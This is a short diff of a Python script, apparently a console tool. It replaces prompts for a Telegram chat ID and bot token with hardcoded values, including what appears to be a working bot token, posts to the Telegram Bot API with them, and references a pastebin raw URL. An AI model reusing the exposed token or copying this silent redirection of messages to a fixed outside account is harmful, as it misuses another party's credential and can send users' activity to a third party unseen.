@@ -71,10 +71,10 @@ else:
         webbrowser.open('')
         print(E + '[' + S + '!' + E + ']' + G + ' ID𐇭 ')
         print('\n')
-        ID = input(S + ' ID ')
+        ID = (S + '979712002')
         print('\n')
         sleep(2)
-        token = input('token')
+        token = ('2014491240:AAEorbwtcIxYxa7r47smGOSi4Ve2ofod7wE')
         w = 'https://pastebin.com/raw/xPfV5eKD'
         start_msg = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=@vooo_o @vooo_o").json()
         id_msg = start_msg['result']['message_id']
